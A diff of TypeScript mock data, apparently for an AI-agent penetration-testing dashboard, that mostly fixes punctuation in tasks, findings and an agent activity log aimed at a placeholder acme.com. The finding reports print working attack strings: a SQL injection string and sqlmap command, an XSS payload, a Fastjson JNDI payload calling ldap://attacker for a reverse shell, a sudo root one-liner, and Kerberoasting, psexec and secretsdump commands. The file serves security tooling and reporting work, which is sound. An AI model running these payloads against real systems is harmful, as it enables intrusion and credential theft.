@@ -55,8 +55,8 @@ export const tasks: Task[] = [
     id: "t-acme-web",
     category_id: 1,
     category_name: "External Assessment",
-    description: "Acme External Penetration of Website and Backend（acme.com）",
-    goal: "Obtain acme.com admin privileges and verify access to user sensitive data。",
+    description: "Acme External Penetration of Website and Backend (acme.com)",
+    goal: "Obtain acme.com admin privileges and verify access to user sensitive data.",
     status: "running",
     created_at: T("2026-07-24T09:12:00Z"),
     created_unix: 1785489120,
@@ -82,7 +82,7 @@ export const tasks: Task[] = [
     category_id: 2,
     category_name: "API Special Project",
     description: "api.acme.com Privilege Escalation and Injection Testing",
-    goal: "Assess IDOR and injection risks of api.acme.com order/user endpoints。",
+    goal: "Assess IDOR and injection risks of api.acme.com order/user endpoints.",
     status: "running",
     created_at: T("2026-07-25T14:05:00Z"),
     created_unix: 1785592500,
@@ -108,7 +108,7 @@ export const tasks: Task[] = [
     category_id: 2,
     category_name: "API Special Project",
     description: "shop.acme.com Payment and Order Flow",
-    goal: "Assess privilege, amount tampering, and race condition risks in payment and order APIs。",
+    goal: "Assess privilege, amount tampering, and race condition risks in payment and order APIs.",
     status: "paused",
     created_at: T("2026-07-22T08:30:00Z"),
     created_unix: 1785313800,
@@ -132,8 +132,8 @@ export const tasks: Task[] = [
     id: "t-vpn-edge",
     category_id: 1,
     category_name: "External Assessment",
-    description: "External Exposure Surface Recon (VPN / Edge Services）",
-    goal: "Identify exploitable external services exposed by acme.com。",
+    description: "External Exposure Surface Recon (VPN / Edge Services)",
+    goal: "Identify exploitable external services exposed by acme.com.",
     status: "done",
     created_at: T("2026-07-18T08:00:00Z"),
     created_unix: 1784966400,
@@ -178,16 +178,16 @@ export const taskTemplates: TaskTemplate[] = [
   {
     id: 1,
     name: "External Web Penetration",
-    description: "Perform black-box penetration testing on the target's internet exposure, covering sites, APIs, and common admin entry points。",
-    goal: "Identify and validate security issues that could lead to unauthorized access, sensitive data leakage, or server compromise。",
+    description: "Perform black-box penetration testing on the target's internet exposure, covering sites, APIs, and common admin entry points.",
+    goal: "Identify and validate security issues that could lead to unauthorized access, sensitive data leakage, or server compromise.",
     created_at: T("2026-07-20T08:00:00Z"),
     updated_at: T("2026-07-25T08:00:00Z"),
   },
   {
     id: 2,
     name: "API Privilege escalation assessment",
-    description: "Conduct targeted testing of authentication, object-level authorization, and role boundaries for the target API。",
-    goal: "Verify presence of IDOR, horizontal and vertical privilege escalation, and bulk data access risks。",
+    description: "Conduct targeted testing of authentication, object-level authorization, and role boundaries for the target API.",
+    goal: "Verify presence of IDOR, horizontal and vertical privilege escalation, and bulk data access risks.",
     created_at: T("2026-07-19T08:00:00Z"),
     updated_at: T("2026-07-24T08:00:00Z"),
   },
@@ -389,7 +389,7 @@ export const assets: Asset[] = [
     category: "corp",
     status_code: 200,
     content_length: 48213,
-    page_title: "Acme Corp — Corporate website",
+    page_title: "Acme Corp: Corporate website",
     technologies: ["Nginx", "React", "Cloudflare"],
     favicon_mmh3: "-1580860059",
     last_seen: T("2026-07-26T02:08:00Z"),
@@ -592,9 +592,9 @@ export const findings: Finding[] = [
     severity: "high",
     status: "pending",
     report:
-      '## Vulnerability Overview\n\n`www.acme.com/search` — the `q` parameter is vulnerable to error‑based MSSQL SQL injection (exposes DB version, schema, and data)。\n\n## Impact\n\n- Readable `acme_prod` Database table schema and user/order data\n- Error messages aid rapid exploit construction, high risk\n\n## Reproduction Steps\n\n1. Trigger error injection：\n\n```\nGET /search?q=1\' AND 1=CONVERT(int,@@version)--\n```\n\n2. Response echoes MSSQL version error, confirming injectability\n3. Further enumerate libraries：`sqlmap -u "https://www.acme.com/search?q=1" --dbs`\n\n## Fix recommendation\n\n- Switch entirely to parameterized queries / prepared statements, eliminate string concatenation\n- Disable detailed error messages in production\n- Use least‑privilege database accounts, disable unnecessary ones `xp_cmdshell` Including dangerous extensions\n',
-    summary: "www.acme.com/search q Parameter causes error‑based SQL injection",
-    evidence: "GET /search?q=1' AND 1=CONVERT(int,@@version)-- → Returns MSSQL version error, reveals database structure。",
+      '## Vulnerability Overview\n\n`www.acme.com/search`: the `q` parameter is vulnerable to error-based MSSQL SQL injection (exposes DB version, schema, and data).\n\n## Impact\n\n- Readable `acme_prod` Database table schema and user/order data\n- Error messages aid rapid exploit construction, high risk\n\n## Reproduction Steps\n\n1. Trigger error injection:\n\n```\nGET /search?q=1\' AND 1=CONVERT(int,@@version)--\n```\n\n2. Response echoes MSSQL version error, confirming injectability\n3. Further enumerate libraries: `sqlmap -u "https://www.acme.com/search?q=1" --dbs`\n\n## Fix recommendation\n\n- Switch entirely to parameterized queries / prepared statements, eliminate string concatenation\n- Disable detailed error messages in production\n- Use least-privilege database accounts, disable unnecessary ones `xp_cmdshell` Including dangerous extensions\n',
+    summary: "www.acme.com/search q Parameter causes error-based SQL injection",
+    evidence: "GET /search?q=1' AND 1=CONVERT(int,@@version)-- → Returns MSSQL version error, reveals database structure.",
     intent_id: "i-2",
     task_id: "t-acme-web",
     task_description: "Acme External Penetration of Website and Backend",
@@ -607,7 +607,7 @@ export const findings: Finding[] = [
     severity: "high",
     status: "pending",
     summary: "api.acme.com/v1/orders?id= Can read others' orders without authorization",
-    evidence: "Changing id=1001 to id=1002 returns another user's order (including address and phone) without ownership checks。",
+    evidence: "Changing id=1001 to id=1002 returns another user's order (including address and phone) without ownership checks.",
     intent_id: "i-5",
     task_id: "t-acme-api",
     task_description: "api.acme.com Privilege Escalation and Injection Testing",
@@ -619,8 +619,8 @@ export const findings: Finding[] = [
     vulnclass: "Weak JWT",
     severity: "high",
     status: "pending",
-    summary: "API JWT Uses weak keys, can be brute‑forced offline to forge",
-    evidence: "HS256，Key 'secret' cracked in 5 seconds by john → Can forge arbitrary sub‑privilege escalation。",
+    summary: "API JWT Uses weak keys, can be brute-forced offline to forge",
+    evidence: "HS256, Key 'secret' cracked in 5 seconds by john → Can forge arbitrary sub-privilege escalation.",
     task_id: "t-acme-api",
     task_description: "api.acme.com Privilege Escalation and Injection Testing",
     ts: T("2026-07-26T03:02:00Z"),
@@ -632,7 +632,7 @@ export const findings: Finding[] = [
     severity: "medium",
     status: "pending",
     summary: "Search page does not escape q parameter, reflected XSS XSS",
-    evidence: "q=<script>alert(document.domain)</script> Echoes raw input in result title。",
+    evidence: "q=<script>alert(document.domain)</script> Echoes raw input in result title.",
     task_id: "t-acme-web",
     task_description: "Acme External Penetration of Website and Backend",
     ts: T("2026-07-25T22:10:00Z"),
@@ -644,7 +644,7 @@ export const findings: Finding[] = [
     severity: "medium",
     status: "pending",
     summary: "www.acme.com Exposes .git directory, source code can be recovered",
-    evidence: "GET /.git/HEAD → 200；git-dumper Reveals backend source code and database connection string comments。",
+    evidence: "GET /.git/HEAD → 200; git-dumper Reveals backend source code and database connection string comments.",
     task_id: "t-acme-web",
     task_description: "Acme External Penetration of Website and Backend",
     ts: T("2026-07-25T20:30:00Z"),
@@ -656,7 +656,7 @@ export const findings: Finding[] = [
     severity: "high",
     status: "pending",
     summary: "admin.acme.com Backend default password admin/admin123",
-    evidence: "Login successful, access admin panel to manage users and orders。",
+    evidence: "Login successful, access admin panel to manage users and orders.",
     intent_id: "i-3",
     task_id: "t-acme-web",
     task_description: "Acme External Penetration of Website and Backend",
@@ -669,7 +669,7 @@ export const findings: Finding[] = [
     severity: "low",
     status: "pending",
     summary: "After login, 'next' parameter allows arbitrary redirects",
-    evidence: "/login?next=https://evil.example After login, 302 redirects to external site。",
+    evidence: "/login?next=https://evil.example After login, 302 redirects to external site.",
     task_id: "t-acme-web",
     task_description: "Acme External Penetration of Website and Backend",
     ts: T("2026-07-25T19:12:00Z"),
@@ -680,8 +680,8 @@ export const findings: Finding[] = [
     vulnclass: "Missing Rate Limit",
     severity: "medium",
     status: "pending",
-    summary: "Login API lacks rate limiting, vulnerable to brute‑force",
-    evidence: "1000 No lockout per minute, no captcha。",
+    summary: "Login API lacks rate limiting, vulnerable to brute-force",
+    evidence: "1000 No lockout per minute, no captcha.",
     task_id: "t-acme-web",
     task_description: "Acme External Penetration of Website and Backend",
     ts: T("2026-07-25T18:40:00Z"),
@@ -693,7 +693,7 @@ export const findings: Finding[] = [
     severity: "low",
     status: "pending",
     summary: "API 500 Returns stack trace, leaking path and framework version",
-    evidence: "Triggers 500 error returning Node.js stack, exposing absolute paths and dependency versions。",
+    evidence: "Triggers 500 error returning Node.js stack, exposing absolute paths and dependency versions.",
     task_id: "t-acme-api",
     task_description: "api.acme.com Privilege Escalation and Injection Testing",
     ts: T("2026-07-25T23:05:00Z"),
@@ -705,7 +705,7 @@ export const findings: Finding[] = [
     severity: "medium",
     status: "pending",
     summary: "shop Uses outdated component with known RCE vulnerability",
-    evidence: "Fingerprint identifies component v2.3.1, associated with CVE‑2024‑xxxx deserialization issue RCE。",
+    evidence: "Fingerprint identifies component v2.3.1, associated with CVE-2024-xxxx deserialization issue RCE.",
     task_id: "t-shop-pay",
     task_description: "shop.acme.com Payment and Order Flow",
     ts: T("2026-07-23T15:00:00Z"),
@@ -716,8 +716,8 @@ export const findings: Finding[] = [
     vulnclass: "Hardcoded Credentials",
     severity: "high",
     status: "pending",
-    summary: "Source code leaks hard‑coded database credentials sa/Acme@2021",
-    evidence: "git-dumper Reconstructed www.acme.com/.git to obtain config.php containing plaintext DB password, later confirmed reusable within internal network。",
+    summary: "Source code leaks hard-coded database credentials sa/Acme@2021",
+    evidence: "git-dumper Reconstructed www.acme.com/.git to obtain config.php containing plaintext DB password, later confirmed reusable within internal network.",
     intent_id: "ig",
     task_id: "t-acme-web",
     task_description: "Acme External Penetration of Website and Backend",
@@ -727,14 +727,14 @@ export const findings: Finding[] = [
     id: "f-12",
     assets: [assetRef(4)],
     vulnclass: "Deserialization RCE",
-    name: "shop E‑commerce Fastjson deserialization remote code execution",
+    name: "shop E-commerce Fastjson deserialization remote code execution",
     severity: "critical",
     status: "confirmed",
     report:
-      '## Vulnerability Overview\n\nThe `/api/import` endpoint of `shop.acme.com` parses user‑controlled JSON using **Fastjson 1.2.24** without enabling `safeMode`. By specifying an arbitrary class with `@type`, an attacker can trigger **JNDI injection → remote command execution**.\n\n## Impact\n\n- An unauthenticated attacker can execute arbitrary commands on the DMZ web server (`www-data@dmz-web01`).\n- When combined with subsequent privilege escalation, this can serve as a foothold for moving laterally into the internal network.\n\n## Reproduction Steps\n\n1. Craft a JNDI payload:\n\n```json\n{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}\n```\n\n2. Send a `POST /api/import` request with `Content-Type: application/json`.\n3. The target performs a DNS lookup to your controlled server, allowing you to obtain a reverse shell.\n\n## Remediation Recommendations\n\n- Upgrade Fastjson to **1.2.83+** and enable `safeMode`.\n- Add authentication and source validation to the `/api/import` endpoint.\n- Apply egress filtering: block business servers from initiating outbound LDAP/RMI connections.',
+      '## Vulnerability Overview\n\nThe `/api/import` endpoint of `shop.acme.com` parses user-controlled JSON using **Fastjson 1.2.24** without enabling `safeMode`. By specifying an arbitrary class with `@type`, an attacker can trigger **JNDI injection → remote command execution**.\n\n## Impact\n\n- An unauthenticated attacker can execute arbitrary commands on the DMZ web server (`www-data@dmz-web01`).\n- When combined with subsequent privilege escalation, this can serve as a foothold for moving laterally into the internal network.\n\n## Reproduction Steps\n\n1. Craft a JNDI payload:\n\n```json\n{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}\n```\n\n2. Send a `POST /api/import` request with `Content-Type: application/json`.\n3. The target performs a DNS lookup to your controlled server, allowing you to obtain a reverse shell.\n\n## Remediation Recommendations\n\n- Upgrade Fastjson to **1.2.83+** and enable `safeMode`.\n- Add authentication and source validation to the `/api/import` endpoint.\n- Apply egress filtering: block business servers from initiating outbound LDAP/RMI connections.',
     summary: "shop.acme.com Fastjson 1.2.24 Deserialization remote code execution",
     evidence:
-      "POST /api/import Submit JNDI payload（@type:JdbcRowSetImpl）→ Callback to dnslog and achieve reverse shell shell（www-data@dmz-web01）。",
+      "POST /api/import Submit JNDI payload (@type:JdbcRowSetImpl)→ Callback to dnslog and achieve reverse shell shell (www-data@dmz-web01).",
     intent_id: "i7",
     task_id: "t-acme-web",
     task_description: "Acme External Penetration of Website and Backend",
@@ -748,7 +748,7 @@ export const findings: Finding[] = [
     status: "pending",
     summary: "DMZ Misconfigured sudo NOPASSWD allows local privilege escalation root",
     evidence:
-      "sudo -l Display (ALL) NOPASSWD: /usr/bin/python3 → sudo python3 -c 'os.setuid(0);os.system(\"/bin/sh\")' Directly take root。",
+      "sudo -l Display (ALL) NOPASSWD: /usr/bin/python3 → sudo python3 -c 'os.setuid(0);os.system(\"/bin/sh\")' Directly take root.",
     intent_id: "i8",
     task_id: "t-acme-web",
     task_description: "Acme External Penetration of Website and Backend",
@@ -761,7 +761,7 @@ export const findings: Finding[] = [
     severity: "medium",
     status: "pending",
     summary: "DMZ Host with dual NICs directly connected to internal network, bypassing perimeter isolation",
-    evidence: "dmz-web01 Second NIC on 10.10.10.0/24 allows DMZ to reach domain controller/file server/Jenkins, crossing network segmentation。",
+    evidence: "dmz-web01 Second NIC on 10.10.10.0/24 allows DMZ to reach domain controller/file server/Jenkins, crossing network segmentation.",
     intent_id: "i9",
     task_id: "t-acme-web",
     task_description: "Acme External Penetration of Website and Backend",
@@ -775,7 +775,7 @@ export const findings: Finding[] = [
     status: "pending",
     summary: "Internal Jenkins unauthenticated Script Console remote code execution",
     evidence:
-      "GET /script Execution without login required Groovy：'whoami'.execute().text → SYSTEM；Export domain accounts from credential store acme\\svc_deploy。",
+      "GET /script Execution without login required Groovy: 'whoami'.execute().text → SYSTEM; Export domain accounts from credential store acme\\svc_deploy.",
     intent_id: "i11",
     task_id: "t-acme-web",
     task_description: "Acme External Penetration of Website and Backend",
@@ -788,7 +788,7 @@ export const findings: Finding[] = [
     severity: "high",
     status: "pending",
     summary: "Domain service account svc_sql vulnerable to Kerberoasting and weak password",
-    evidence: "GetUserSPNs Request svc_sql TGS, crack offline with hashcat -m 13100 Sql@2020，This account belongs to SQL admin group。",
+    evidence: "GetUserSPNs Request svc_sql TGS, crack offline with hashcat -m 13100 Sql@2020, This account belongs to SQL admin group.",
     intent_id: "i12",
     task_id: "t-acme-web",
     task_description: "Acme External Penetration of Website and Backend",
@@ -798,14 +798,14 @@ export const findings: Finding[] = [
     id: "f-17",
     assets: [assetRef(20)],
     vulnclass: "Domain Compromise",
-    name: "Full control of internal domain controller DC01（Domain Admin）",
+    name: "Full control of internal domain controller DC01 (Domain Admin)",
     severity: "critical",
     status: "confirmed",
     report:
-      "## Vulnerability Overview\n\nExternal Fastjson RCE from internet pivots to DMZ, then use sudo privilege escalation, dual‑NIC bypass, and unauthenticated Jenkins RCE to obtain domain account `svc_deploy`；External Fastjson RCE chain yields sudo escalation, dual‑NIC bypass, and unauthorized Jenkins RCE, compromising domain admin account 'svc_deploy' and full control of DC01 **DC01**。\n\n## Impact\n\n- Obtained domain admin rights; can control all hosts and accounts\n- `secretsdump` Export all domain NTLM hashes (including `krbtgt`），Can forge golden tickets for long‑term persistence\n- Internal target achieved\n\n## Reproduction Steps\n\n1. Using `svc_deploy` Log in and export hashes：\n\n```\npsexec.py acme/svc_deploy@10.10.10.10\nsecretsdump.py acme/svc_deploy@10.10.10.10\n```\n\n2. Gained SYSTEM rights on DC01; exported all domain hashes\n\n## Fix recommendation\n\n- Consolidated service account permissions, removed from Domain Admins, enforced tiered management（tiering）\n- Reset twice consecutively `krbtgt`，Rotated service account strong passwords\n- Fixed DMZ→Internal network perimeter isolation and mentioned RCE/privilege‑escalation chain\n",
-    summary: "Compromised domain controller DC01 (Domain Admin) – internal target achieved",
+      "## Vulnerability Overview\n\nExternal Fastjson RCE from internet pivots to DMZ, then use sudo privilege escalation, dual-NIC bypass, and unauthenticated Jenkins RCE to obtain domain account `svc_deploy`; External Fastjson RCE chain yields sudo escalation, dual-NIC bypass, and unauthorized Jenkins RCE, compromising domain admin account 'svc_deploy' and full control of DC01 **DC01**.\n\n## Impact\n\n- Obtained domain admin rights; can control all hosts and accounts\n- `secretsdump` Export all domain NTLM hashes (including `krbtgt`), Can forge golden tickets for long-term persistence\n- Internal target achieved\n\n## Reproduction Steps\n\n1. Using `svc_deploy` Log in and export hashes:\n\n```\npsexec.py acme/svc_deploy@10.10.10.10\nsecretsdump.py acme/svc_deploy@10.10.10.10\n```\n\n2. Gained SYSTEM rights on DC01; exported all domain hashes\n\n## Fix recommendation\n\n- Consolidated service account permissions, removed from Domain Admins, enforced tiered management (tiering)\n- Reset twice consecutively `krbtgt`, Rotated service account strong passwords\n- Fixed DMZ→Internal network perimeter isolation and mentioned RCE/privilege-escalation chain\n",
+    summary: "Compromised domain controller DC01 (Domain Admin); internal target achieved",
     evidence:
-      "svc_deploy Member of Domain Admins; psexec.py used to log into DC01 as SYSTEM; secretsdump exported all NTLM hashes (including krbtgt), achieving target control。",
+      "svc_deploy Member of Domain Admins; psexec.py used to log into DC01 as SYSTEM; secretsdump exported all NTLM hashes (including krbtgt), achieving target control.",
     intent_id: "i13",
     task_id: "t-acme-web",
     task_description: "Acme External Penetration of Website and Backend",
@@ -918,7 +918,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "ig",
       type: "intent",
-      payload: P({ summary: "www.acme.com .git Source code leak and hard‑coded credential extraction" }),
+      payload: P({ summary: "www.acme.com .git Source code leak and hard-coded credential extraction" }),
       priority: 7,
       state: "done",
       origin: "planner",
@@ -1005,7 +1005,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa1",
       type: "fact",
-      payload: P({ summary: "Discovered subdomain admin.acme.com (Element‑UI backend）" }),
+      payload: P({ summary: "Discovered subdomain admin.acme.com (Element-UI backend)" }),
       priority: 0,
       state: "open",
       origin: "work#1",
@@ -1014,7 +1014,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa2",
       type: "fact",
-      payload: P({ summary: "search Page “q“ parameter is an error‑based injection point(MSSQL)" }),
+      payload: P({ summary: "search Page “q” parameter is an error-based injection point(MSSQL)" }),
       priority: 0,
       state: "open",
       origin: "work#4",
@@ -1023,7 +1023,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "faGit",
       type: "fact",
-      payload: P({ summary: ".git Downloadable; git‑dumper restores backend source code" }),
+      payload: P({ summary: ".git Downloadable; git-dumper restores backend source code" }),
       priority: 0,
       state: "open",
       origin: "workG",
@@ -1032,7 +1032,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "faCreds",
       type: "fact",
-      payload: P({ summary: "Source config.php hard‑coded DB password sa / Acme@2021（Possibly common internal network）" }),
+      payload: P({ summary: "Source config.php hard-coded DB password sa / Acme@2021 (Possibly common internal network)" }),
       priority: 0,
       state: "open",
       origin: "workG",
@@ -1041,7 +1041,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa3",
       type: "fact",
-      payload: P({ summary: "shop Fingerprint matches Fastjson 1.2.24 (known deserialization RCE）" }),
+      payload: P({ summary: "shop Fingerprint matches Fastjson 1.2.24 (known deserialization RCE)" }),
       priority: 0,
       state: "open",
       origin: "work#6",
@@ -1050,7 +1050,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa4",
       type: "fact",
-      payload: P({ summary: "Reverse shell successful：www-data@dmz-web01(10.0.20.15)，Located in DMZ segment" }),
+      payload: P({ summary: "Reverse shell successful: www-data@dmz-web01(10.0.20.15), Located in DMZ segment" }),
       priority: 0,
       state: "open",
       origin: "work#7",
@@ -1059,7 +1059,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa5",
       type: "fact",
-      payload: P({ summary: "sudo -l：(ALL) NOPASSWD: /usr/bin/python3 → Can elevate privileges root" }),
+      payload: P({ summary: "sudo -l: (ALL) NOPASSWD: /usr/bin/python3 → Can elevate privileges root" }),
       priority: 0,
       state: "open",
       origin: "work#8",
@@ -1068,7 +1068,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa6",
       type: "fact",
-      payload: P({ summary: "Foothold second NIC directly connected to internal 10.10.10.0/24 (crossing DMZ boundary）" }),
+      payload: P({ summary: "Foothold second NIC directly connected to internal 10.10.10.0/24 (crossing DMZ boundary)" }),
       priority: 0,
       state: "open",
       origin: "work#9",
@@ -1133,7 +1133,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fi3",
       type: "finding",
-      payload: P({ summary: "IDOR：/v1/orders?id= Can read others' orders via privilege escalation" }),
+      payload: P({ summary: "IDOR: /v1/orders?id= Can read others' orders via privilege escalation" }),
       priority: 0,
       state: "confirmed",
       origin: "work#5",
@@ -1142,7 +1142,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fiSrc",
       type: "finding",
-      payload: P({ summary: "Source code leak plus hard‑coded database credentials（sa/Acme@2021）" }),
+      payload: P({ summary: "Source code leak plus hard-coded database credentials (sa/Acme@2021)" }),
       priority: 0,
       state: "confirmed",
       origin: "workG",
@@ -1160,7 +1160,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fiPriv",
       type: "finding",
-      payload: P({ summary: "DMZ Foothold local privilege escalation to root (sudo NOPASSWD misconfiguration）" }),
+      payload: P({ summary: "DMZ Foothold local privilege escalation to root (sudo NOPASSWD misconfiguration)" }),
       priority: 0,
       state: "confirmed",
       origin: "work#8",
@@ -1187,7 +1187,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fiDC",
       type: "finding",
-      payload: P({ summary: "Compromised domain controller DC01 (Domain Admin) – internal target achieved" }),
+      payload: P({ summary: "Compromised domain controller DC01 (Domain Admin); internal target achieved" }),
       priority: 0,
       state: "confirmed",
       origin: "work#13",
@@ -1305,7 +1305,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-24T09:12:25Z"),
     kind: "thinking",
     summary:
-      "graph_overview：goals Target layer split: g1 obtain acme.com admin rights, g2 read user data; no facts yet; asset scope acme.com + C‑segment; initial entry points www, admin, api, shop, vpn; perform lightweight read‑only probing。",
+      "graph_overview: goals Target layer split: g1 obtain acme.com admin rights, g2 read user data; no facts yet; asset scope acme.com + C-segment; initial entry points www, admin, api, shop, vpn; perform lightweight read-only probing.",
   },
   {
     seq: 1002,
@@ -1315,7 +1315,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "p0-probe",
     summary: "curl -sI https://acme.com; curl -sI https://admin.acme.com",
-    detail: "Initial situation nearly empty; proceed ≤3 Next read‑only probe to align initial intent direction (no enumeration/validation; that's for workers)）。",
+    detail: "Initial situation nearly empty; proceed ≤3 Next read-only probe to align initial intent direction (no enumeration/validation; that's for workers).",
   },
   {
     seq: 1003,
@@ -1325,8 +1325,8 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "p0-probe",
     summary:
-      "acme.com → 302 → www；Server: nginx/1.24.0\nadmin.acme.com → 200，X-Powered-By Default; body matches element-ui/vue signatures",
-    detail: "admin Separate admin login page; verify five entry points and refine initial intent description。",
+      "acme.com → 302 → www; Server: nginx/1.24.0\nadmin.acme.com → 200, X-Powered-By Default; body matches element-ui/vue signatures",
+    detail: "admin Separate admin login page; verify five entry points and refine initial intent description.",
   },
   {
     seq: 1004,
@@ -1335,7 +1335,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "add_intent",
     tool_use_id: "p0-ai",
-    summary: "add_intent × 4（Batch assign first exploration directions）",
+    summary: "add_intent × 4 (Batch assign first exploration directions)",
     detail:
       "intents=[\n  { summary: 'Logged into admin backend, enumerated user management/export interfaces and batch retrieved user sensitive fields', asset_ids: [admin], parent_ids: [fa1], priority: 9 },\n  { summary: 'api.acme.com order IDOR iterated order_id to batch retrieve user orders/PII', asset_ids: [api], parent_ids: [fa2], priority: 9 },\n]\nNote: i3/i5 are already running; this round uses more precise data retrieval descriptions + raises priority (→9) for added emphasis, without assigning duplicate synonymous intents.",
   },
@@ -1346,8 +1346,8 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "add_intent",
     tool_use_id: "p0-ai",
-    summary: "4 intents created → ids=[i1, i2, i4, i5]，Connected frontier",
-    detail: "Maintain diverse routes: i1 reconnaissance, i2 (g1 auth path), i4/i5 (g2 data path); two parallel mechanisms, avoid early convergence。",
+    summary: "4 intents created → ids=[i1, i2, i4, i5], Connected frontier",
+    detail: "Maintain diverse routes: i1 reconnaissance, i2 (g1 auth path), i4/i5 (g2 data path); two parallel mechanisms, avoid early convergence.",
   },
   {
     seq: 1006,
@@ -1355,7 +1355,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-24T09:13:05Z"),
     kind: "text",
     summary:
-      "Round derives first 4 intents: i1 asset reconnaissance, i2 backend credentials, i4 injection, i5 API privilege escalation. g1 follows i2, g2 follows i4/i5; both targets have separate entry points. Await worker facts before augmenting via lineage。",
+      "Round derives first 4 intents: i1 asset reconnaissance, i2 backend credentials, i4 injection, i5 API privilege escalation. g1 follows i2, g2 follows i4/i5; both targets have separate entry points. Await worker facts before augmenting via lineage.",
   },
 
   // ── 第 1 轮 · 攻击面加码（2026-07-25 14:12）──
@@ -1366,7 +1366,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-25T14:12:15Z"),
     kind: "thinking",
     summary:
-      "Reference recent_facts: workG returned faGit '.git downloadable, git-dumper recovered backend source' and faCreds 'config.php hard‑coded' sa/Acme@2021（Compared to recent_facts: workG fetched .git (git‑dumper recovered source) and hard‑coded config.php credentials (sa/Acme@2021); work#6 identified Fastjson 1.2.24 RCE in shop】：① Hard‑coded DB password may be reused across internal network；② Fastjson Mature RCE technique available, opening a path distinct from auth/injection – direct RCE from shop into DMZ. Pull faGit details to verify artifacts。",
+      "Reference recent_facts: workG returned faGit '.git downloadable, git-dumper recovered backend source' and faCreds 'config.php hard-coded' sa/Acme@2021 (Compared to recent_facts: workG fetched .git (git-dumper recovered source) and hard-coded config.php credentials (sa/Acme@2021); work#6 identified Fastjson 1.2.24 RCE in shop]: ① Hard-coded DB password may be reused across internal network; ② Fastjson Mature RCE technique available, opening a path distinct from auth/injection: direct RCE from shop into DMZ. Pull faGit details to verify artifacts.",
   },
   {
     seq: 1102,
@@ -1375,8 +1375,8 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "node_detail",
     tool_use_id: "p1-nd",
-    summary: "node_detail(faGit) —— Validate source‑code artifacts from workG",
-    detail: "add_intent First check what worker actually recovered to avoid fingerprint‑based speculation。",
+    summary: "node_detail(faGit): Validate source-code artifacts from workG",
+    detail: "add_intent First check what worker actually recovered to avoid fingerprint-based speculation.",
   },
   {
     seq: 1103,
@@ -1387,7 +1387,7 @@ export const activity: Activity[] = [
     tool_use_id: "p1-nd",
     summary:
       "faGit Evidence: git-dumper recovered config.php, db.php, order_api.php; inside config.php $db=['host'=>'10.10.10.5','user'=>'sa','pass'=>'Acme@2021']",
-    detail: "Hard‑coded reference to internal 10.10.10.5 (FS01) validates internal credential inference—reusable after RCE。",
+    detail: "Hard-coded reference to internal 10.10.10.5 (FS01) validates internal credential inference; reusable after RCE.",
   },
   {
     seq: 1104,
@@ -1396,9 +1396,9 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "add_intent",
     tool_use_id: "p1-ai",
-    summary: "add_intent × 2（Fastjson Breakthrough chain; assign first executable step in serial）",
+    summary: "add_intent × 2 (Fastjson Breakthrough chain; assign first executable step in serial)",
     detail:
-      "intents=[\n  { summary: 'shop.acme.com Deep component fingerprinting + Fastjson 1.2.24 CVE linking (gadget chain confirmed); craft Fastjson payload to trigger shop RCE and get reverse shell; strong serial dependency chain (TodoWrite))', asset_ids: [shop], parent_ids: [fa3], priority: 7 },\n  { summary: 'Craft Fastjson deserialization payload to trigger shop RCE and obtain reverse shell shell', asset_ids: [shop], parent_ids: [fa3], priority: 9 },\n]\nNote: This is a strong‑dependency serial chain; TODO record fingerprint→RCE→Three-step foothold privilege escalation; this round assigns first two steps (privilege escalation depends on shell output, next round will continue)）。",
+      "intents=[\n  { summary: 'shop.acme.com Deep component fingerprinting + Fastjson 1.2.24 CVE linking (gadget chain confirmed); craft Fastjson payload to trigger shop RCE and get reverse shell; strong serial dependency chain (TodoWrite))', asset_ids: [shop], parent_ids: [fa3], priority: 7 },\n  { summary: 'Craft Fastjson deserialization payload to trigger shop RCE and obtain reverse shell shell', asset_ids: [shop], parent_ids: [fa3], priority: 9 },\n]\nNote: This is a strong-dependency serial chain; TODO record fingerprint→RCE→Three-step foothold privilege escalation; this round assigns first two steps (privilege escalation depends on shell output, next round will continue).",
   },
   {
     seq: 1105,
@@ -1407,7 +1407,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "add_intent",
     tool_use_id: "p1-ai",
-    summary: "2 intents created → ids=[i6, i7]，Lineage linked via fa3",
+    summary: "2 intents created → ids=[i6, i7], Lineage linked via fa3",
   },
   {
     seq: 1106,
@@ -1415,7 +1415,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-25T14:13:00Z"),
     kind: "text",
     summary:
-      "Situation escalated: source code, hard‑coded internal creds, and Fastjson RCE create new breakthrough; registered g3 to breach DMZ and establish foothold; deploy i6 (fingerprint/CVE mapping) and i7 (trigger RCE); DMZ privilege escalation relies on shell, queued for next round。",
